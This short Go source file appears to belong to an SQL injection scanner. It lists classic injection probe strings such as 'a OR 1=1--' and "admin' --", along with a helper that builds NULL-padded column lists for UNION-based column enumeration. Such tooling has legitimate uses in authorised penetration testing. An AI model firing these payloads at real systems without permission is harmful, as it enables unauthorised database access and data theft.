
package main

var inital_checks = map[string]string{
	"1 --":        "",
	"1 #":        "",
	"a OR 1=1--": "",
	"a OR 1=1#":  "",
	"a OR 1=1/*": "",
	"a) OR '1'='1--":    "",
	"a) OR ('1'='1--":   "",
}

var inital_checks_escape = map[string]string{
	"1'":          "'",
	"admin' --":   "'",
	"admin'/*":    "'",
	"a' OR 1=1--": "'",
	"a' OR 1=1#":  "'",
	"a' OR 1=1/*": "'",
	"a') OR '1'='1--":    "'",
	"a') OR ('1'='1--":   "'",
}

func generate_database_command(colNum int, ctype string) [][]string {
	var commands []string
	var num string
	for i := 1; i <= colNum; i++ {
		num = "NULL"
		commands = append(commands, num)
	}
	var cmd_options [][]string
	for i := range commands {
		opt := make([]string, colNum)
		copy(opt, commands)
		opt[i] = ctype
		cmd_options = append(cmd_options, opt)
	}

	return cmd_options
}
